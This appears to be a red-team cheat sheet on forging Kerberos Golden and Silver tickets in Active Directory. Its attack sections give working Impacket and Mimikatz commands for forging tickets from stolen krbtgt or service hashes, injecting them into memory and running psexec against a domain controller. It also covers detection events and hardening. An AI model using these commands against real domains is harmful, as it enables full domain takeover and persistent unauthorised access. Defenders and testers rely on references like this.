---
title: "Golden & Silver Tickets"
category: "red-team"
tags: ["persistence", "active-directory", "kerberos", "credential-access"]
platform: "windows"
mitre: ["T1558.001", "T1558.002"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# Golden & Silver Tickets

## TL;DR
Forge Kerberos tickets from stolen key material. A **Golden Ticket** forges a TGT using the `krbtgt` hash → impersonate anyone, domain-wide, for near-unlimited persistence. A **Silver Ticket** forges a TGS using a service/computer account hash → access one specific service, stealthier (never talks to the DC).

## Requirements
```text
Golden: krbtgt NT hash (or AES key) + domain SID  -> full domain compromise persistence
Silver: target service account / computer NT hash + domain SID + service SPN
Get krbtgt via DCSync (see active-directory/dcsync.md) or NTDS dump.
```

## Golden Ticket
```bash
# Impacket – forge, then use with -k
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc.corp.local
```
```powershell
# Mimikatz – forge and inject into memory (pass-the-ticket)
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

## Silver Ticket (stealthier — no DC contact)
```bash
# Forge a TGS for a specific service (e.g. CIFS on a host)
impacket-ticketer -nthash <machine_or_svc_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn cifs/target.corp.local administrator
```
```text
Common SPNs: cifs (file access), host (scheduled tasks/WMI), http (WinRM),
             mssqlsvc (SQL), ldap (with DC hash -> DCSync-like reach)
```

## Detection (Blue Team)
```text
Golden: TGS requests (4769) with NO preceding AS-REQ/TGT (4768) for that user;
        tickets with anomalous/very long lifetimes; non-existent or mismatched user;
        RC4 tickets in an AES environment.
Silver: service access (4624/4634) without corresponding 4768/4769 on the DC
        (the DC never sees the forged TGS) — correlate host logs vs DC logs.
```

## Mitigation / Hardening
- **Rotate krbtgt twice** (invalidates all Golden Tickets) — routinely and after any DA compromise.
- Protect Tier 0 / limit who can DCSync; monitor 4769-without-4768 anomalies.
- Enforce AES (disable RC4), gMSA for service accounts (long, rotating passwords), short ticket lifetimes.

## Sources
- [MITRE T1558.001 (Golden)](https://attack.mitre.org/techniques/T1558/001/) · [T1558.002 (Silver)](https://attack.mitre.org/techniques/T1558/002/) · [ADSecurity – Golden Ticket](https://adsecurity.org/?p=1640)
